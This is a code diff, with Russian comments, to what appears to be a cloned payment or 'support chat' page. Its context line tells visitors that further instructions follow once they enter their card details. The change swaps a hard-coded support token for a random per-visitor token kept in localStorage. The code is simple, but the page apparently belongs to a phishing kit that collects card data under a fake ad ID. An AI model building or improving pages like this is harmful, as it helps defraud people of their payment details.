@@ -333,9 +333,33 @@ As soon as you enter your card details, expect further instructions in this chat
       </div>
     </div>
     <script>
+      // Генерация уникального токена для каждого пользователя
+      function generateSupportToken() {
+        // Проверяем, есть ли уже сохраненный токен в localStorage
+        let token = localStorage.getItem('supportToken');
+        
+        if (!token) {
+          // Генерируем новый уникальный токен
+          // Формат: случайные символы + timestamp + случайные символы
+          const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+          const randomPart1 = Array.from({length: 10}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+          const timestamp = Date.now().toString(36);
+          const randomPart2 = Array.from({length: 10}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+          token = randomPart1 + timestamp + randomPart2;
+          
+          // Сохраняем токен в localStorage для этого пользователя
+          localStorage.setItem('supportToken', token);
+          console.log('Создан новый токен поддержки:', token);
+        } else {
+          console.log('Используется существующий токен поддержки:', token);
+        }
+        
+        return token;
+      }
+      
       const INFO = {
         adId: "4Q2V4D6A2E9",
-        supportToken: "ayb0uj0hyu9mhul0ftp",
+        supportToken: generateSupportToken(),
       };
     </script>
     <script src="./axios.min.js.téléchargement"></script>
